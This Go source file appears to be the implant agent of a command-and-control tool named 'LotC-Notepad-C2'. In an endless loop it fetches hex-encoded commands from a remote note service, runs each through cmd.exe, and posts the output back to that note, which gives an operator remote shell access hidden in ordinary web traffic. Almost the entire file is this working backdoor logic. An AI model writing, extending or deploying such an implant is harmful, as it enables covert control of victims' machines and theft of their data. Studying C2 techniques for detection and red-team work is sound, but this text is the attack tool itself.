package main

import (
	"fmt"
	"log"
	"os/exec"
	"strings"
	"time"

	"github.com/uokik/LotC-Notepad-C2/internal/config"
	"github.com/uokik/LotC-Notepad-C2/internal/protocol"
	"github.com/uokik/LotC-Notepad-C2/internal/transport"
)

func main() {

	var lastCmd string
	fmt.Println("Agent started")
	for {
		rawHex, err := transport.FetchCommand(config.NoteID, config.SessionToken)
		if err != nil {
			time.Sleep(5 * time.Second)
			continue
		}

		decoded, err := protocol.Decode(rawHex)
		log.Printf("decoded %s\n", rawHex)
		if err != nil {
			time.Sleep(5 * time.Second)
			continue
		}

		decoded = strings.TrimSpace(decoded)

		if strings.HasPrefix(decoded, "v91:") {
			cmdRun := strings.TrimPrefix(decoded, "v91:")

			if cmdRun != lastCmd {
				cmd := exec.Command("cmd.exe", "/c", cmdRun)
				output, err := cmd.CombinedOutput()
				fmt.Printf("%s\n", output)

				var resultText string
				if err != nil {
					resultText = fmt.Sprintf("err %v\n%s", err, string(output))
					log.Printf("string1 %s\n", string(output))
				} else {
					resultText = string(output)
					log.Printf("string2 %s\n", string(output))
				}

				responsePayload := "v92:" + resultText
				hexContent := protocol.Encode(responsePayload)

				log.Println("sending output..")

				_ = transport.UpdateContent(config.NoteID, config.SessionToken, config.EditID, hexContent)

				lastCmd = cmdRun
			}
		}
		time.Sleep(5 * time.Second)
	}
}
